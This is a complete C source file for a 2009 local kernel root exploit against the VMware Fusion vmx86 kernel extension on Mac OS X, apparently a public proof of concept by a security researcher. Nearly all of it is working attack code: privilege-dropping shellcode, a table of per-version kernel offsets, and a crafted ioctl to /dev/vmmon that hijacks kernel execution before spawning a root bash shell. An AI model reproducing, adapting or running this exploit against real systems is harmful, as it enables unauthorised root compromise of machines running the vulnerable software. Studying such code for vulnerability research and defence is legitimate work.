/* vmware-fission.c
 *
 * Copyright (c) 2009 by <mu-b@digit-labs.org>
 *
 * VMware Fusion <= 2.0.5 vmx86 kext local kernel root exploit
 * by mu-b - Tue 23 June 2009
 *
 * - Tested on: VMware Fusion 2.0.4 (10.5.x)
 *              VMware Fusion 2.0.5 (10.5.x)
 *
 * http://seclists.org/fulldisclosure/2009/Oct/29
 * http://lists.vmware.com/pipermail/security-announce/2009/000066.html
 *
 * note: this requires the driver to be 'un-initialised', that is,
 *       you need to hit it _before_ VMware Fusion is first used!
 *       (or, just use another bug to panic the box first ;))
 *
 * - this exploit is provided for educational purposes _only_. You are free
 *   to use this code in any way you wish provided you do not work for, or
 *   are associated in any way with Portcullis Computer Security Ltd.
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2009!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/param.h>
#include <unistd.h>

#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_host.h>

#ifndef IOCPARM_MASK
#define IOCPARM_MASK      0x1FFF
#endif
#ifndef IOCPARM_LEN
#define IOCPARM_LEN(a)    (((a) >> 16) & IOCPARM_MASK)
#endif
#define VMX86_INIT_IOCTL  0x802E564A

static unsigned char zleopard[] =
  /* _stack_walk        */
  "\x89\xe8"                      /* mov eax, ebp        */
  "\x8b\x00"                      /* mov eax, [eax]      */
  "\x8b\x00"                      /* mov eax, [eax]      */
  /* _drop_privs_dirty  */
  "\x8b\x40\x18"                  /* mov eax, [eax+0x18] */
  "\x8b\x40\x64"                  /* mov eax, [eax+0x64] */
  "\xc7\x40\x10\x00\x00\x00\x00"  /* mov [eax+0x10], 0   */
  "\x31\xc0"                      /* xor eax, eax        */
  "\xc3";                         /* ret                 */

static struct targets {
  const char *name;
  int shell_addr;   /* +&offset */
} targets_t[] = {
  { "2.0.4", 0x000D1460 },
  { "2.0.5", 0x000D1460 },
  { NULL, 0 },
};

struct ioctl_req {
  char pad[IOCPARM_LEN(VMX86_INIT_IOCTL)];
};

int
main (int argc, char **argv)
{
  kmod_info_t *kmod_list, *k;
  mach_port_t host_port;
  kern_return_t mach_r;
  struct ioctl_req req;
  unsigned int count;
  int shell_addr;
  int fd, id, i, r;

  printf ("VMware Fusion <= 2.0.5 vmx86 kext local kernel root exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2009!@$!\n\n");

  host_port = mach_host_self ();
  mach_r = kmod_get_info (host_port, (void *) &kmod_list, &count);
  if (mach_r != KERN_SUCCESS)
    {
      fprintf (stderr, "* couldn't get list of loaded kexts from kernel - %s\n",
               mach_error_string (mach_r));
      exit (EXIT_FAILURE);
    }

  for (k = kmod_list; k; k = (k->next) ? (k + 1) : NULL)
    if (strcmp (k->name, "com.vmware.kext.vmx86") == 0)
      break;

  if (k == NULL)
    {
      fprintf (stderr, "%s: vmx86 kext not loaded?\n", argv[0]);
      exit (EXIT_FAILURE);
    }

  for (i = 0; targets_t[i].name; i++)
    if (strcmp (targets_t[i].name, k->version) == 0)
      {
        shell_addr = targets_t[i].shell_addr;
        break;
      }

  if (targets_t[i].name == NULL)
    {
      fprintf (stderr, "%s: unsupported vmx86 version found :( [%s]\n",
               argv[0], k->version);
      exit (EXIT_FAILURE);
    }

  printf ("* kmod: %s, version: %s, addr: 0x%08X -> 0x%08X\n",
          strrchr (k->name, '.') + 1, k->version, (int) k->address, (int) (k->address + k->size));
  printf ("* ret addr: 0x%08X + 0x%08X = @0x%08X\n",
          (int) k->address, shell_addr + 0x1000, (int) k->address + shell_addr + 0x1000);

  fd = open ("/dev/vmmon", O_RDONLY);
  if (fd < 0)
    {
      fprintf (stderr, "%s: open failed\n", argv[0]);
      exit (EXIT_FAILURE);
    }

  memset (&req, 0xCC, sizeof req);
  memcpy (&req.pad, zleopard, sizeof zleopard - 1);
  *(unsigned int *) &req.pad[0x21] = k->address + shell_addr + 0x1000;

  printf ("* hitting...");
  fflush (stdout);
  sleep (2);

  r = ioctl (fd, VMX86_INIT_IOCTL, &req);
  printf ("done\n\n");
  close (fd);

  id = getuid ();
  printf ("* getuid(): %d\n", id);
  if (id == 0)
    {
      char *args[] = { "/bin/bash", NULL };
      printf ("+Wh00t\n\n");

      execve (args[0], args, NULL);
    }
  else
    fprintf (stderr, "%s: failed to obtain root :(\n", argv[0]);

  return (EXIT_SUCCESS);
}

